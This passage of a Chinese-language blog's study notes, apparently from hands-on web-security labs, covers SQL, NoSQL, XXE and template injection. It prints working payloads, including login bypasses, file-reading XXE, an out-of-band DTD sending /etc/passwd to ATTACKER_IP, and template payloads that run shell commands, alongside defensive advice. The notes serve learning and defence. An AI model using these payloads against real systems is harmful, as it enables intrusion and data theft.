book_id,ssn,book_name,author,book_id,book_name,author,flag</span></span><span class="line"></span><span class="line"><span style="color: #98C379">&#39;</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">UNION</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">SELECT</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">,group_concat(book_id,</span><span style="color: #98C379">&quot;::&quot;</span><span style="color: #ABB2BF">,book_name,</span><span style="color: #98C379">&quot;::&quot;</span><span style="color: #ABB2BF">,author,</span><span style="color: #98C379">&quot;::&quot;</span><span style="color: #ABB2BF">,book_id,</span><span style="color: #98C379">&quot;::&quot;</span><span style="color: #ABB2BF">,book_name,</span><span style="color: #98C379">&quot;::&quot;</span><span style="color: #ABB2BF">,author,</span><span style="color: #98C379">&quot;::&quot;</span><span style="color: #ABB2BF">,flag SEPARATOR </span><span style="color: #98C379">&#39;&lt;br&gt;&#39;</span><span style="color: #ABB2BF">) </span><span style="color: #C678DD">FROM</span><span style="color: #ABB2BF"> books ; #</span></span></code></pre></div></div></figure><h2 id="最佳实践"><a href="#最佳实践" class="headerlink" title="最佳实践"></a>最佳实践</h2><h3 id="代码方面"><a href="#代码方面" class="headerlink" title="代码方面"></a>代码方面</h3><h4 id="参数化查询和预处理语句"><a href="#参数化查询和预处理语句" class="headerlink" title="参数化查询和预处理语句"></a>参数化查询和预处理语句</h4><p>使用带参数的查询和预编译语句可以让用户的所有输入变成数据而不是可执行的语句。</p><figure class="shiki php"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E06C75">$stmt</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$pdo</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #61AFEF">prepare</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;</span><span style="color: #C678DD">SELECT</span><span style="color: #98C379"> </span><span style="color: #ABB2BF">*</span><span style="color: #98C379"> </span><span style="color: #C678DD">FROM</span><span style="color: #98C379"> users </span><span style="color: #C678DD">WHERE</span><span style="color: #98C379"> username </span><span style="color: #56B6C2">=</span><span style="color: #98C379"> :username&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #E06C75">$stmt</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #61AFEF">execute</span><span style="color: #ABB2BF">([</span><span style="color: #98C379">&#39;username&#39;</span><span style="color: #ABB2BF"> =&gt; </span><span style="color: #E06C75">$username</span><span style="color: #ABB2BF">]);</span></span></code></pre></div></div></figure><p>像这样就提前把 SQL 语句传给服务器了，服务器只接受一个 username 字段，然后只把输入当成字符处理。</p><h4 id="输入校验和处理"><a href="#输入校验和处理" class="headerlink" title="输入校验和处理"></a>输入校验和处理</h4><p>Use built-in functions such as <code>htmlspecialchars()</code> and <code>filter_var()</code> in PHP to sanitise inputs effectively.</p><h4 id="最小权限原则"><a href="#最小权限原则" class="headerlink" title="最小权限原则"></a>最小权限原则</h4><p>避免用高权限数据库账户操作数据库</p><h4 id="存储过程"><a href="#存储过程" class="headerlink" title="存储过程"></a>存储过程</h4><p>封装 SQL 逻辑</p><h4 id="定期安全审计和代码审查"><a href="#定期安全审计和代码审查" class="headerlink" title="定期安全审计和代码审查"></a>定期安全审计和代码审查</h4><p>不用说</p><h3 id="SQL-注入高级技巧"><a href="#SQL-注入高级技巧" class="headerlink" title="SQL 注入高级技巧"></a>SQL 注入高级技巧</h3><p>以下是一些渗透测试人员在面对 SQL 注入漏洞时，常用的更高级的利用手法：</p><h4 id="利用特定数据库功能"><a href="#利用特定数据库功能" class="headerlink" title="利用特定数据库功能"></a>利用特定数据库功能</h4><p>不同的数据库管理系统（DBMS），如 MySQL、PostgreSQL、Oracle 和 MSSQL，都有自己独特的功能和语法。渗透测试人员需要了解目标 DBMS 的具体特性才能有效地利用它们。例如，<strong>MSSQL 支持 <code>xp_cmdshell</code> 命令，它能被用来执行操作系统命令</strong>，这允许攻击者在数据库服务器上运行系统级别的指令。</p><h4 id="利用详细错误信息"><a href="#利用详细错误信息" class="headerlink" title="利用详细错误信息"></a>利用详细错误信息</h4><p>攻击者可以利用应用程序返回的详细错误信息来获取数据库的架构和结构。<strong>基于错误的 SQL 注入</strong>就是指通过精心构造查询，故意让应用程序生成包含有用信息（如数据库版本、表名、列名等）的错误消息。例如，使用 <code>1&#39; AND 1=CONVERT(int, (SELECT @@version)) --</code> 这样的语句，可以触发错误并泄露数据库的版本信息。</p><h4 id="绕过-WAF-和过滤器"><a href="#绕过-WAF-和过滤器" class="headerlink" title="绕过 WAF 和过滤器"></a>绕过 WAF 和过滤器</h4><p>为了绕过 Web 应用防火墙（WAF）和输入过滤器，渗透测试人员会尝试各种混淆技术。这包括：</p><ul><li><strong>大小写混合</strong> (<code>SeLeCt</code>)。</li><li><strong>字符串连接</strong> (<code>CONCAT(CHAR(83), CHAR(69), CHAR(76), CHAR(69), CHAR(67), CHAR(84))</code> 来代替 <code>SELECT</code>)。</li><li><strong>使用不同的编码方式</strong>（如十六进制编码、URL 编码）。</li><li><strong>利用内联注释</strong> (<code>/**/</code>) 和<strong>不同字符编码</strong>（如 <code>%09</code> 代表制表符，<code>%0A</code> 代表换行符）来绕过简单的过滤器。</li></ul><h4 id="数据库指纹识别"><a href="#数据库指纹识别" class="headerlink" title="数据库指纹识别"></a>数据库指纹识别</h4><p>确定数据库的类型和版本是定制攻击的关键一步。这可以通过发送特定的查询来实现，因为不同的 DBMS 会对相同的查询给出不同的结果。例如，<code>SELECT version()</code> 在 PostgreSQL 上有效，而 <code>SELECT @@version</code> 则适用于 MySQL 和 MSSQL。通过这些差异，攻击者可以准确识别目标数据库。</p><h4 id="利用-SQL-注入进行内网渗透"><a href="#利用-SQL-注入进行内网渗透" class="headerlink" title="利用 SQL 注入进行内网渗透"></a>利用 SQL 注入进行内网渗透</h4><p>SQL 注入漏洞不仅能获取数据库信息，还可以作为跳板，进一步渗透到网络的其他部分。一旦数据库服务器被攻破，它就可以被用来访问其他内部系统。这可能涉及从数据库中提取凭据（如用户名和密码），或者利用系统之间已存在的信任关系来扩大攻击范围。</p><h1 id="NO-SQL"><a href="#NO-SQL" class="headerlink" title="NO SQL"></a>NO SQL</h1><h2 id="No-SQL-注入"><a href="#No-SQL-注入" class="headerlink" title="No SQL 注入"></a>No SQL 注入</h2><h3 id="注入类型"><a href="#注入类型" class="headerlink" title="注入类型"></a>注入类型</h3><ul><li><p>语法注入</p><ul><li>类似于传统的 SQL 注入了，操纵语句导致执行非预期行为</li></ul></li><li><p>操作符注入</p><ul><li><p>而这个就是用 NoSQL 特殊的操作符，改变逻辑代码的行为了</p></li><li><figure class="shiki js"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E5C07B">db</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">users</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">find</span><span style="color: #ABB2BF">({ </span><span style="color: #E06C75">username</span><span style="color: #ABB2BF">: </span><span style="color: #98C379">&#39;admin&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">password</span><span style="color: #ABB2BF">: { </span><span style="color: #98C379">&quot;$ne&quot;</span><span style="color: #ABB2BF">: </span><span style="color: #D19A66">null</span><span style="color: #ABB2BF"> } });</span></span></code></pre></div></div></figure></li></ul></li></ul><h2 id="操作符注入"><a href="#操作符注入" class="headerlink" title="操作符注入"></a>操作符注入</h2><figure class="shiki js"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">[</span><span style="color: #98C379">&#39;username&#39;</span><span style="color: #C678DD">=&gt;</span><span style="color: #ABB2BF">[</span><span style="color: #98C379">&#39;$ne&#39;</span><span style="color: #C678DD">=&gt;</span><span style="color: #98C379">&#39;xxxx&#39;</span><span style="color: #ABB2BF">], </span><span style="color: #98C379">&#39;password&#39;</span><span style="color: #C678DD">=&gt;</span><span style="color: #ABB2BF">[</span><span style="color: #98C379">&#39;$ne&#39;</span><span style="color: #C678DD">=&gt;</span><span style="color: #98C379">&#39;yyyy&#39;</span><span style="color: #ABB2BF">]]</span></span></code></pre></div></div></figure><p>这样一个代码就能把整个数据库 dump 出来。</p><h3 id="POST-请求传数组"><a href="#POST-请求传数组" class="headerlink" title="POST 请求传数组"></a>POST 请求传数组</h3><p>HTTP 的语法 <code>key[subkey]=value</code></p><figure class="shiki js"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E06C75">user</span><span style="color: #ABB2BF">[</span><span style="color: #E06C75">$ne</span><span style="color: #ABB2BF">]</span><span style="color: #56B6C2">=</span><span style="color: #E06C75">xxxx</span><span style="color: #56B6C2">&amp;</span><span style="color: #E06C75">pass</span><span style="color: #ABB2BF">[</span><span style="color: #E06C75">$ne</span><span style="color: #ABB2BF">]</span><span style="color: #56B6C2">=</span><span style="color: #E06C75">yyyy</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF"># </span><span style="color: #E06C75">登录</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">admin</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">之外的用户</span></span><span class="line"><span style="color: #E06C75">user</span><span style="color: #ABB2BF">[</span><span style="color: #E06C75">$nin</span><span style="color: #ABB2BF">][]</span><span style="color: #56B6C2">=</span><span style="color: #E06C75">admin</span><span style="color: #56B6C2">&amp;</span><span style="color: #E06C75">pass</span><span style="color: #ABB2BF">[</span><span style="color: #E06C75">$ne</span><span style="color: #ABB2BF">]</span><span style="color: #56B6C2">=</span><span style="color: #E06C75">yyyy</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF"># </span><span style="color: #E06C75">nin</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">接收的是一个数组</span><span style="color: #ABB2BF">，</span><span style="color: #E06C75">用这种方式来拼接的</span></span><span class="line"><span style="color: #E06C75">user</span><span style="color: #ABB2BF">[</span><span style="color: #E06C75">$nin</span><span style="color: #ABB2BF">][]</span><span style="color: #56B6C2">=</span><span style="color: #E06C75">admin</span><span style="color: #56B6C2">&amp;</span><span style="color: #E06C75">user</span><span style="color: #ABB2BF">[</span><span style="color: #E06C75">$nin</span><span style="color: #ABB2BF">][]</span><span style="color: #56B6C2">=</span><span style="color: #E06C75">pedro</span><span style="color: #56B6C2">&amp;</span><span style="color: #E06C75">user</span><span style="color: #ABB2BF">[</span><span style="color: #E06C75">$nin</span><span style="color: #ABB2BF">][]</span><span style="color: #56B6C2">=</span><span style="color: #E06C75">john</span><span style="color: #56B6C2">&amp;</span><span style="color: #E06C75">user</span><span style="color: #ABB2BF">[</span><span style="color: #E06C75">$nin</span><span style="color: #ABB2BF">][]</span><span style="color: #56B6C2">=</span><span style="color: #E06C75">secret</span><span style="color: #56B6C2">&amp;</span><span style="color: #E06C75">pass</span><span style="color: #ABB2BF">[</span><span style="color: #E06C75">$ne</span><span style="color: #ABB2BF">]</span><span style="color: #56B6C2">=</span><span style="color: #E06C75">yyyy</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF"># </span><span style="color: #E06C75">爆破密码位数</span></span><span class="line"><span style="color: #E06C75">user</span><span style="color: #56B6C2">=</span><span style="color: #E06C75">john</span><span style="color: #56B6C2">&amp;</span><span style="color: #E06C75">pass</span><span style="color: #ABB2BF">[</span><span style="color: #E06C75">$regex</span><span style="color: #ABB2BF">]</span><span style="color: #56B6C2">=^</span><span style="color: #ABB2BF">.{</span><span style="color: #D19A66">8</span><span style="color: #ABB2BF">}</span><span style="color: #E06C75">$</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF"># </span><span style="color: #E06C75">爆破密码</span></span><span class="line"><span style="color: #E06C75">user</span><span style="color: #56B6C2">=</span><span style="color: #E06C75">john</span><span style="color: #56B6C2">&amp;</span><span style="color: #E06C75">pass</span><span style="color: #ABB2BF">[</span><span style="color: #E06C75">$regex</span><span style="color: #ABB2BF">]</span><span style="color: #56B6C2">=^</span><span style="color: #D19A66">1.</span><span style="color: #ABB2BF">......</span><span style="color: #E06C75">$</span></span><span class="line"></span><span class="line"><span style="color: #D19A66">10584312</span></span></code></pre></div></div></figure><h2 id="语法注入"><a href="#语法注入" class="headerlink" title="语法注入"></a>语法注入</h2><p>这一节就有点抽象了，要结合具体代码来理解，原始代码如下</p><figure class="shiki js"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E06C75">for</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">x</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">in</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">mycol</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">find</span><span style="color: #ABB2BF">({</span><span style="color: #98C379">&quot;$where&quot;</span><span style="color: #ABB2BF">: </span><span style="color: #98C379">&quot;this.username == &#39;&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">username</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;&#39;&quot;</span><span style="color: #ABB2BF">}):</span></span></code></pre></div></div></figure><h3 id="发现注入"><a href="#发现注入" class="headerlink" title="发现注入"></a>发现注入</h3><p>这是我们加了一个 <code>&#39;</code> 让他报错得出来的原始代码，这个其实是三个部分拼接而成的</p><ul><li>“this.username &#x3D;&#x3D; ‘“</li><li>username</li><li>“‘“</li></ul><p>如果我们加了一个 <code>&#39;</code> 执行的语句就变成了</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">&quot;this.username == &#39;admin&#39;&#39;&quot;</span></span></code></pre></div></div></figure><p>那肯定会报错的</p><h3 id="验证注入"><a href="#验证注入" class="headerlink" title="验证注入"></a>验证注入</h3><p>第一次输入：<code>admin&#39; &amp;&amp; 0 &amp;&amp; &#39;x</code></p><p>执行的语句变成</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">&quot;this.username == &#39;admin&#39; &amp;&amp; 0 &amp;&amp; &#39;x&#39;&quot;</span></span></code></pre></div></div></figure><p><code>&quot;this.username == &#39;admin&#39;</code> 这是一个布尔值， <code>&amp;&amp; 0</code> 与任何值计算都是 false，所以折一整个语句都会是 false。</p><p><code>&amp;&amp; &#39;x</code> 的作用是为了闭合原始查询中剩下的引号。</p><p>第二次输入： <code>admin&#39; &amp;&amp; 1 &amp;&amp; &#39;x</code></p><p>执行的语句为：</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">&quot;this.username == &#39;admin&#39; &amp;&amp; 1 &amp;&amp; &#39;x&#39;&quot;</span></span></code></pre></div></div></figure><p>执行结果为真，返回结果，证明注入存在。</p><h3 id="利用注入"><a href="#利用注入" class="headerlink" title="利用注入"></a>利用注入</h3><p>Payload：<code>admin&#39;||1||&#39;</code></p><p>具体执行的代码：</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">&quot;this.username == &#39;admin&#39;||1||&#39;&#39;&quot;</span></span></code></pre></div></div></figure><p>不论 admin 存在和不存在，这个表达式都能返回真，导致整个数据库泄露。</p><h1 id="XXE-注入"><a href="#XXE-注入" class="headerlink" title="XXE 注入"></a>XXE 注入</h1><p>介绍了一堆实体和解析器，不懂，没了解过</p><p>payload 主要是下面这个，用自带的实体解析器，去执行语句或者读取文件</p><figure class="shiki xml"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">&lt;!</span><span style="color: #C678DD">DOCTYPE</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">foo</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">[</span></span><span class="line"><span style="color: #ABB2BF">&lt;!</span><span style="color: #C678DD">ENTITY</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">xxe</span><span style="color: #C678DD"> SYSTEM </span><span style="color: #98C379">&quot;file:///opt/14232d6db2b5fd937aa92e8b3c48d958.txt&quot;</span><span style="color: #ABB2BF"> &gt;</span><span style="color: #D19A66">]</span><span style="color: #ABB2BF">&gt;</span></span></code></pre></div></div></figure><h2 id="带外-XXE"><a href="#带外-XXE" class="headerlink" title="带外 XXE"></a>带外 XXE</h2><p> 构建一个 DTD 文件</p><figure class="shiki dtd"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre><code><!ENTITY % cmd SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"><!ENTITY % oobxxe "<!ENTITY exfil SYSTEM 'http://ATTACKER_IP:1337/?data=%cmd;'>">%oobxxe;</code></pre></div></div></figure><p>payload</p><figure class="shiki xml"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">&lt;?</span><span style="color: #E06C75">xml</span><span style="color: #D19A66"> version</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;1.0&quot;</span><span style="color: #D19A66"> encoding</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;UTF-8&quot;</span><span style="color: #ABB2BF">?&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;!</span><span style="color: #C678DD">DOCTYPE</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">upload</span><span style="color: #ABB2BF"> SYSTEM &quot;http://ATTACKER_IP:1337/sample.dtd&quot;&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">upload</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">    &lt;</span><span style="color: #E06C75">file</span><span style="color: #ABB2BF">&gt;</span><span style="color: #D19A66">&amp;</span><span style="color: #E06C75">exfil</span><span style="color: #D19A66">;</span><span style="color: #ABB2BF">&lt;/</span><span style="color: #E06C75">file</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;/</span><span style="color: #E06C75">upload</span><span style="color: #ABB2BF">&gt;</span></span></code></pre></div></div></figure><p>攻击机起一个 http 服务端，会接收到拿回来的数据。</p><h2 id="SSRF-XXE"><a href="#SSRF-XXE" class="headerlink" title="SSRF + XXE"></a>SSRF + XXE</h2><p>同样的套路，payload 如下，要配合 Burp 使用，遍历这个主机上的端口</p><figure class="shiki xml"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">&lt;!</span><span style="color: #C678DD">DOCTYPE</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">foo</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">[</span></span><span class="line"><span style="color: #ABB2BF">  &lt;!ELEMENT foo ANY &gt;</span></span><span class="line"><span style="color: #ABB2BF">  &lt;!</span><span style="color: #C678DD">ENTITY</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">xxe</span><span style="color: #C678DD"> SYSTEM </span><span style="color: #98C379">&quot;http://localhost:§10§/&quot;</span><span style="color: #ABB2BF"> &gt;</span></span><span class="line"><span style="color: #D19A66">]</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">contact</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">  &lt;</span><span style="color: #E06C75">name</span><span style="color: #ABB2BF">&gt;</span><span style="color: #D19A66">&amp;</span><span style="color: #E06C75">xxe</span><span style="color: #D19A66">;</span><span style="color: #ABB2BF">&lt;/</span><span style="color: #E06C75">name</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">  &lt;</span><span style="color: #E06C75">email</span><span style="color: #ABB2BF">&gt;test@test.com&lt;/</span><span style="color: #E06C75">email</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">  &lt;</span><span style="color: #E06C75">message</span><span style="color: #ABB2BF">&gt;test&lt;/</span><span style="color: #E06C75">message</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;/</span><span style="color: #E06C75">contact</span><span style="color: #ABB2BF">&gt;</span></span></code></pre></div></div></figure><h2 id="缓解措施"><a href="#缓解措施" class="headerlink" title="缓解措施"></a>缓解措施</h2><h3 id="最佳实践-1"><a href="#最佳实践-1" class="headerlink" title="最佳实践"></a>最佳实践</h3><p>禁用外部实体和 DTDs</p><p>使用简单数据格式，比如说 JSON</p><p>增强输入校验，检验输入数据是否符合特定的格式，还有过滤一些 XML 特有的符号，比如 <code>&lt;, &gt;, &amp;, &#39;, and &quot;</code> </p><hr><h1 id="Server-side-Template-Injection"><a href="#Server-side-Template-Injection" class="headerlink" title="Server-side Template Injection"></a>Server-side Template Injection</h1><p>主要还是用了那个模板引擎的一些模板语法，造成注入</p><h2 id="区分模板引擎"><a href="#区分模板引擎" class="headerlink" title="区分模板引擎"></a>区分模板引擎</h2><p>Twig 执行 <code>&#123;&#123;7*7'&#125;&#125;</code> 会输出 49，Jinja2 则会输出 7777777</p><p>Jade&#x2F;Pug，则是用 # 代表模板语法，#{7*7} would return 49</p><h3 id="PHP-Smarty"><a href="#PHP-Smarty" class="headerlink" title="PHP - Smarty"></a>PHP - Smarty</h3><figure class="shiki php"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 输出结果会全部变成大写</span></span><span class="line"><span style="color: #ABB2BF">{</span><span style="color: #98C379">&#39;Hello&#39;</span><span style="color: #56B6C2">|</span><span style="color: #ABB2BF">upper}</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 可以直接调用 PHP 语法</span></span><span class="line"><span style="color: #ABB2BF">{</span><span style="color: #56B6C2">system</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;ls&quot;</span><span style="color: #ABB2BF">)}</span></span></code></pre></div></div></figure><h3 id="NodeJS-Pug"><a href="#NodeJS-Pug" class="headerlink" title="NodeJS - Pug"></a>NodeJS - Pug</h3><h4 id="关键漏洞点"><a href="#关键漏洞点" class="headerlink" title="关键漏洞点"></a>关键漏洞点</h4><ul><li>JavaScript 执行<ul><li>Pug 允许嵌入 JS 语句在 #{} 里面，会被当成 JS 代码执行，造成任意代码执行。</li></ul></li><li>默认转义<ul><li>Pug 模板引擎在渲染时，会**自动对某些输出进行 HTML 转义 (HTML Escaping)**。这意味着当你在模板中使用标准的 <code>#&#123;&#125;</code> 进行变量插值时，Pug 会把 HTML 特殊字符（比如 <code>&lt;</code>、<code>&gt;</code>、<code>&amp;</code>、<code>&quot;</code>、<code>&#39;</code>）转换成它们的 HTML 实体编码。<ul><li><strong><code>#&#123;&#125;</code> (默认行为)：</strong> HTML 转义，主要用于<strong>防 XSS</strong>。</li><li><strong><code>!&#123;&#125;</code> (非转义)：</strong> <strong>不进行 HTML 转义</strong>，因此如果使用不当，<strong>容易导致 XSS</strong>。</li></ul></li><li><strong>默认转义的局限性：</strong> 尽管能防大部分 XSS，但对 <code>!&#123;&#125;</code> 无效，且不能阻止<strong>服务端层面的代码执行（SSTI 本身）</strong>，因为 SSTI 发生在模板渲染的服务器端，而 HTML 转义是针对生成 HTML 内容的。</li></ul></li></ul><h4 id="利用-Payload"><a href="#利用-Payload" class="headerlink" title="利用 Payload"></a>利用 Payload</h4><figure class="shiki javascript"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">#{</span><span style="color: #E5C07B">root</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">process</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">mainModule</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">require</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;child_process&#39;</span><span style="color: #ABB2BF">).</span><span style="color: #61AFEF">spawnSync</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;ls&#39;</span><span style="color: #ABB2BF">).</span><span style="color: #E06C75">stdout</span><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure><p> <code>spawnSync</code> 不能直接传命令执行，它不会自动解析你传入的命令字符串中的参数。它会把整个字符串当作一个单一的命令来尝试执行，而不是拆分成命令和独立参数。</p><figure class="shiki javascript"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">spawnSync</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">command</span><span style="color: #ABB2BF">, [</span><span style="color: #E06C75">args</span><span style="color: #ABB2BF">], [</span><span style="color: #E06C75">options</span><span style="color: #ABB2BF">])</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF"># </span><span style="color: #E06C75">最终</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">payload</span></span><span class="line"><span style="color: #ABB2BF">#{</span><span style="color: #E5C07B">root</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">process</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">mainModule</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">require</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;child_process&#39;</span><span style="color: #ABB2BF">).</span><span style="color: #61AFEF">spawnSync</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;cat&#39;</span><span style="color: #ABB2BF">, [</span><span style="color: #98C379">&#39;7f58571b42d8c477a2f3efa69a681ac3.txt&#39;</span><span style="color: #ABB2BF">]).</span><span style="color: #E06C75">stdout</span><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure><h3 id="Python-Jinja2"><a href="#Python-Jinja2" class="headerlink" title="Python - Jinja2"></a>Python - Jinja2</h3><p>Jinja2 解析表达式用的是花括号，测试 payload <code>&#123;&#123;7*7&#125;&#125;</code></p><p>一旦确定能执行的话，我们就可以用这个 payload 来实现 RCE</p><figure class="shiki python"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">{{</span><span style="color: #98C379">&quot;&quot;</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">__class__</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">__mro__</span><span style="color: #ABB2BF">[</span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">].</span><span style="color: #E06C75">__subclasses__</span><span style="color: #ABB2BF">()[</span><span style="color: #D19A66">157</span><span style="color: #ABB2BF">].</span><span style="color: #56B6C2">__repr__</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">__globals__</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">get</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;__builtins__&quot;</span><span style="color: #ABB2BF">).</span><span style="color: #61AFEF">get</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;__import__&quot;</span><span style="color: #ABB2BF">)(</span><span style="color: #98C379">&quot;subprocess&quot;</span><span style="color: #ABB2BF">).</span><span style="color: #61AFEF">check_output</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;cat 5d8bea6df83cbb6767a235c4ba54933b.txt&quot;</span><span style="color: #ABB2BF">)}}</span></span></code></pre></div></div></figure><p>拆解一下 payload</p><ul><li><code>&quot;&quot;.__class__.__mro__[1]</code> 这个方法能访问到基类 <code>object</code> ，他是所有 python 类的父类。</li><li><code>__subclasses__()</code>: 把 <code>object</code> 的所有子类显示出来, 然后 <code>[157]</code> 一般是 <code>subprocess.Popen</code> 类的索引（这个索引数和目标环境有关系）。</li></ul><p>然后如果你用 <code>check_output</code> 的话，执行带参数的命令他会当作一个完整的可执行程序名去查找和运行，而不是把 cat 当作程序，文件名当作参数。</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: 